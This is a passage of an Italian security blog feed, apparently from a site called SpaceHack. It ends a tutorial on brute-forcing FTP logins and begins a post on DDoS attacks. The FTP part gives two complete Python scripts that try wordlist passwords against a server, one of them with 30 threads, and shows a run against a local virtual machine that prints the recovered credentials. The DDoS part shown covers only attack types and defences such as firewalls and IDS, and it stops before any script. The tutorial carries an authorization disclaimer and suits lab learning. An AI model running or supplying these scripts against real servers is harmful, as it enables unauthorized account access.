q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Fantastico, è abbastanza simile al precedente, ma qui stiamo usando una coda che all&amp;rsquo;inizio è riempita con l&amp;rsquo;elenco delle password, e nella funzione principale che viene eseguita da quei thread daemon, otteniamo una password dal coda e prova ad accedere con esso. Se la password è corretta, dobbiamo terminare la forzatura bruta, un modo sicuro per farlo è cancellare la coda, ed è quello che stiamo facendo.&lt;/p&gt;
&lt;p&gt;Abbiamo anche utilizzato i thread daemon, quindi questi thread termineranno al termine del thread principale.&lt;/p&gt;
&lt;p&gt;Ecco il codice completo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
init()
&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_correct&lt;/span&gt;(password):
    &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
    server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
        &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials:&amp;#34;&lt;/span&gt;, password, Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))

&lt;span style=&#34;color:#75715e&#34;&gt;# iterate over passwords one by one&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# if the password is found, break out of the loop&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct(password):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ecco invece l’esempio piú complesso:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; threading &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Thread
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; queue
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# initialize the queue&lt;/span&gt;
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Queue()
&lt;span style=&#34;color:#75715e&#34;&gt;# number of threads to spawn&lt;/span&gt;
n_threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect_ftp&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; q
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        &lt;span style=&#34;color:#75715e&#34;&gt;# get the password from the queue&lt;/span&gt;
        password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
        &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
        server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
            &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials: &amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;user&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Password: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# we found the password, let&amp;#39;s clear the queue&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mutex:
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clear()
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all_tasks_done&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;notify_all()
                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unfinished_tasks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
            &lt;span style=&#34;color:#75715e&#34;&gt;# notify the queue that the task is completed for this password&lt;/span&gt;
            q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;task_done()

&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))

&lt;span style=&#34;color:#75715e&#34;&gt;# put all passwords to the queue&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
    q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;put(password)

&lt;span style=&#34;color:#75715e&#34;&gt;# create `n_threads` that runs that function&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n_threads):
    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;connect_ftp)
    &lt;span style=&#34;color:#75715e&#34;&gt;# will end when the main thread end&lt;/span&gt;
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;daemon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
&lt;span style=&#34;color:#75715e&#34;&gt;# wait for the queue to be empty&lt;/span&gt;
q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;prova-sul-campo&#34;&gt;Prova sul Campo&lt;/h1&gt;
&lt;p&gt;Ora che abbiamo tutto, mettiamo alla prova le nostre conoscenze.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Disclaimer: ⚠️ Quello che verrà visto di seguito è un esempio per il solo scopo educativo, violare sistemi informatici senza autorizzazione è un reato, vi invito dunque a replicare quanto vedrete SOLO su sistemi di vostra proprietà. ⚠️&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Andiamo a installare vsftpd e inseriamo un nuovo utente. L&amp;rsquo;utente appena creato avrà come credenziali:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;test : test&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Una volta creato &lt;code&gt;l&#39;utente&lt;/code&gt; &lt;em&gt;test&lt;/em&gt; con la &lt;code&gt;password&lt;/code&gt; &lt;em&gt;test&lt;/em&gt; possiamo inserire le relative informazioni nello script, useremo il secondo essendo che sfrutta i thread, una volta inserito nello script lo username dell&amp;rsquo;utente che ci interessa e l&amp;rsquo;indirizzo IP della macchina avviamo il codice python con:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 brute-ftp.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nel mio caso sto eseguendo lo script su un portatile con Pop os e la macchina &amp;ldquo;vittima&amp;rdquo; è una mcchina Ubuntu virtualizzata su VirtualBox. Una volta che lo script ha finito e riesce a trovare la password per l&amp;rsquo;utente test, questo è l&amp;rsquo;output:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Passwords to try: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying aheq
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying weeqe
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying 9wee
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying wewe
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying test
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found credentials: 
        Host: 192.168.1.242
        User: test
        Password: test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Cos&#39;è un attacco DDoS e come farlo con Python</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/cos%C3%A8-un-attacco-ddos-e-come-farlo-con-python/ddos_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/cos%C3%A8-un-attacco-ddos-e-come-farlo-con-python/ddos_python/</guid>
      <description>Table of Contents  Introduzione  Attacco Smurf Ping of death Attacco TCP SYN flood Come difender?  Firewall IDS     Cos&amp;rsquo;è un Attacco Denial of Service  Tipi di attacco DDoS  Attacchi volumetrici Attacchi ai protocolli Attacchi a livello di applicazione (L7)     Come realizzare uno script per il DDoS   Nel post di oggi andiamo a dare una panoramica di cos&amp;rsquo;è un attacco DDoS e come realizzare un semplice script python che lo esegue, per coloro di voi che sono interessati al tema degli attacchi di rete ho fatto un post anche su Brute Force FTP Server.</description>
      <content>&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#introduzione&#34;&gt;Introduzione&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#attacco-smurf&#34;&gt;Attacco Smurf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ping-of-death&#34;&gt;Ping of death&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#attacco-tcp-syn-flood&#34;&gt;Attacco TCP SYN flood&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#come-difender-&#34;&gt;Come difender?&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#firewall&#34;&gt;Firewall&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ids&#34;&gt;IDS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#cos-%C3%A8-un-attacco-denial-of-service&#34;&gt;Cos&amp;rsquo;è un Attacco Denial of Service&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#tipi-di-attacco-ddos&#34;&gt;Tipi di attacco DDoS&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#attacchi-volumetrici&#34;&gt;Attacchi volumetrici&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#attacchi-ai-protocolli&#34;&gt;Attacchi ai protocolli&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#attacchi-a-livello-di-applicazione-l7-&#34;&gt;Attacchi a livello di applicazione (L7)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#come-realizzare-uno-script-per-il-ddos&#34;&gt;Come realizzare uno script per il DDoS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Nel post di oggi andiamo a dare una panoramica di cos&amp;rsquo;è un attacco DDoS e come realizzare un semplice script python che lo esegue, per coloro di voi
che sono interessati al tema degli attacchi di rete ho fatto un post anche su &lt;a href=&#34;https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/&#34;&gt;Brute Force FTP Server&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Di seguito vi mostrerò il frutto delle mie ricerche in questo ambito 👽.&lt;/p&gt;
&lt;h1 id=&#34;introduzione&#34;&gt;Introduzione&lt;/h1&gt;
&lt;p&gt;Wikipedia lo definisce come un attacco informatico che mira ad esaurire le risorse di un sistema informatico, mirando quindi a negare la disponibilità del servizio verso client benevoli. Come vedremo ci sono diverse modalità per esaurire la risorse di un servizio, ad esempio:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Congestione della rete&lt;/li&gt;
&lt;li&gt;Riempimento della memoria&lt;/li&gt;
&lt;li&gt;Avvelenamento della traduzione a dominio&lt;/li&gt;
&lt;li&gt;Riduzione della potenza di computazione&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Solitamente I DoS sono attacchi temporanei, atti a bloccare le risorse per tempi più o meno brevi, ma ci sono anche casi speciali in cui l’attacco porta ad un danneggiamento o distruzione completa del firmware, solitamente detti PDOs o phlashing. Questi attacchi sono una delle categorie più pericolose per un’azienda o ente che offre servizi via web, in quanto qualunque ‘nemico’ (come aziende concorrenti o governi) con abbastanza risorse potrebbe danneggiare irrimediabilmente la vittima. Chiunque compie questo attacco per divertimento o per “diletto” non ha compreso per nulla le potenzialità e la pericolosità dello stesso.&lt;/p&gt;
&lt;p&gt;Gli attacchi, in base alla modalità possono dividersi in:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Diretti&lt;/strong&gt;: l’attaccante colpisce in maniera diretta la vittima, senza utilizzare host di terze parti;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Indiretti&lt;/strong&gt;: l’attaccante, vuoi per anonimato, vuoi per poca potenza di banda, utilizza sistemi terzi per eseguire l’attacco.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;attacco-smurf&#34;&gt;Attacco Smurf&lt;/h2&gt;
&lt;p&gt;È stato il primo attacco DoS, lanciato verso gli anni ‘90. In esso l’attaccante invia un grande numero di richieste ICMP (Internet Control Message Protocol) ad un indirizzo broadcast. Essendo richieste echo venivano inviate a tutti i nodi partecipanti alla rete i quali rispondevano alla richiesta, inviando anche loro un messaggio, questa volta all’indirizzo IP vittima (lo spoofed IP), il quale veniva inondato letteralmente di pacchetti.&lt;/p&gt;
&lt;h2 id=&#34;ping-of-death&#34;&gt;Ping of death&lt;/h2&gt;
&lt;p&gt;L’attacco, utilizzato alla fine degli anni ‘90, utilizzava una grave vulnerabilità nel protocollo IP dei principali sistemi operativi. L’attaccante inviava un pacchetto IP malformato che causava un buffer overflow alla vittima e il conseguente blocco del servizio.&lt;/p&gt;
&lt;h2 id=&#34;attacco-tcp-syn-flood&#34;&gt;Attacco TCP SYN flood&lt;/h2&gt;
&lt;p&gt;Questo attacco mira a saturare le risorse della macchina, basandosi su una peculiarità del protocollo TCP, il quale, ogni qualvolta viene aperta una connessione TCP esegue un three way handshake. L’attaccante non esegue di fatto il three way ma invia solo il primo pacchetto SYN, lasciando uno stato aperto (una struttura di memoria fondamentalmente) sul server.&lt;/p&gt;
&lt;p&gt;Una volta che sul server sono presenti migliaia di connessioni aperte per metà, la memoria andrà ad esaurirsi e l’attacco sarà andato a buon fine. Per risolvere questo attacco basta utilizzare un SYN Cookie, cioè si crea la struttura dati solo quando l’handshake è completato. In questo modo non possono essere create strutture a metà ma solo complete, quindi ragionevolmente, solamente da parte di host innocui:&lt;/p&gt;
&lt;h2 id=&#34;come-difender&#34;&gt;Come difender?&lt;/h2&gt;
&lt;p&gt;Le difese a questa tipologia di attacchi sono ormai molte (ricordiamoci che parliamo di attacchi da un singolo host, principalmente con IP statico) e ben testate.&lt;/p&gt;
&lt;h3 id=&#34;firewall&#34;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;I firewall sono device di sicurezza che permettono di controllare il traffico tra le due parti di una rete. Tutto il traffico deve passare quindi attraverso il firewall per essere protetto. Ci sono due tipi di firewall:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;packet filter: lavorano a livello OSI 3 e 4 e ispezionano l’header dei pacchetti IP, oltre alla porta TCP e UDP. Vengono specificate delle regole per le quali certi pacchetti possono o non possono passare, in entrambe le direzioni. I pacchetti possono quindi essere bloccati in base all’indirizzo IP di sorgente o destinazione o la porta TPC/UDP di sorgente o destinazione.&lt;/li&gt;
&lt;li&gt;stateful packet filter: analizzano il pacchetto, comprendendo le richieste e le risposte (SYN,SYN-ACK, ACK).&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ids&#34;&gt;IDS&lt;/h3&gt;
&lt;p&gt;Gli IDS consistono in una serie di sensori che rilevano dati, e possono essere posizionati sia sugli hosts che sulla rete. Ci sono due approcci alla rilevazione di intrusione:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;basato sulla conoscenza: cercano pattern di traffico o attività che sembrano maligne sulla base di informazioni come login falliti, pattern di bit che indicano un attacco di buffer overflow, certi tipi di pacchetti TCP SYN che indicano un attacco SYN flood. Vengono anche detti misuse detection IDS.&lt;/li&gt;
&lt;li&gt;basato sul comportamento: rilevano anomalie nel sistema, in base alle statistiche di utilizzo (e.g. se di notte non c’è traffico, se c’è è un male)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Gli IDS sono quindi sensori distribuiti atti a raccogliere dati, analizzare, riportare le informazioni utili e nel caso reagire. Idealmente:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;proteggono le comunicazioni;&lt;/li&gt;
&lt;li&gt;proteggono I dati;&lt;/li&gt;
&lt;li&gt;possono essere attaccati e manipolati.
Essi si possono dividere in:&lt;/li&gt;
&lt;/ul&gt;
